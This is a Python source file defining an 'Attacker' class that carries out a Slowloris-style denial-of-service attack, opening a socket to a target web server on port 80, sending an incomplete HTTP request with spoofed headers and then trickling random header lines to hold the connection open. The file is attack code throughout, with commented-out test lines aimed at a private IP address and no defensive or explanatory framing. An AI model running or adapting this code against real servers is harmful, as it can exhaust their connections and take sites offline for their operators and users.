import socket
import ssl
import random
import time


class Attacker:
    def __init__(self, target):
        self.target = target
        #We are going back to http for now
        self.port = 80
        self.loris = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.status = "Unconnected"




        self.fakeHeaderList = [
            "User-agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, Gecko) Chrome/55.0.2919.83 Safari/537.36",
            "Accept-language: ru,q=0.5"
        ]
    #This method creates the sockets that will be used in the attack
    def createSocket(self):

        #self.loris.settimeout(4)
        try:
            self.loris.connect((self.target, self.port))
        except Exception:
            pass

        request = f"GET /?{random.randint(0,2000)} HTTP/1.1\r\n"
        #request = "GET / HTTP/1.0\r\n\r\n"
        self.loris.send(request.encode("utf-8"))
        for item in self.fakeHeaderList:
            self.loris.send(item.encode("utf-8"))



        #try:


            #self.loris.connect((self.target, self.port))
            #downgrading to this for now
            #request = "GET / HTTP/1.0\r\n\r\n"

            #self.loris.send(request.encode())



            #Send fake header elements to target
            #for element in self.fakeHeaderList:
             #   self.loris.send(bytes("{}\r\n".format(element).encode("utf-8")))



            #info = self.loris.recv(10000)

           # print(info.decode("utf-8"))


            #self.status = "Connected to " + self.target + " Target on port 443"
        #except Exception as e:
          #  print(e)




    #Method that starts the attack on the target
    def attackTarget(self):
        self.stayAlive()

        self.status = "Attacking "+self.target+""

    #Calls on a socket to stay alive
    def stayAlive(self):
        stayAliveMessage = f"X-a:{random.randint(1,2000)}\r\n"
        #self.loris.send("X-a\r\n:".format(random.randint(1,5000)).encode("utf-8"))
        self.loris.send(stayAliveMessage.encode("utf-8"))


    #Return the current status of the Attacker

    def returnStatus(self):
        return self.status

    def ping(self):

        request = "GET / HTTP/1.0\r\n\r\n"
        self.stayAlive()

        info = self.loris.recv(1000000)

        print(info.decode("utf-8"))

#test = Attacker("192.168.0.243")
#test.createSocket()
#test.ping()
